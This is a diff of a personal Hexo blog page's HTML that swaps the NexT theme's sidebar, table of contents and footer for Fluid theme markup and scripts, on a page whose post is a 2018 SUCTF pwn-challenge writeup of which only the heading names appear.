-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
             
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#basic-pwn"><span class="nav-number">1.</span> <span class="nav-text">basic-pwn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stack"><span class="nav-number">2.</span> <span class="nav-text">stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#babyarray"><span class="nav-number">3.</span> <span class="nav-text">babyarray</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink"><span class="nav-number">4.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ez-heap"><span class="nav-number">5.</span> <span class="nav-text">ez_heap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-overflow-file-structure"><span class="nav-number">6.</span> <span class="nav-text">easy_overflow_file_structure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#int"><span class="nav-number">7.</span> <span class="nav-text">int</span></a></li></ol></div>
-            
-
           </div>
         </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "SUCTF 招新赛 2018 writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
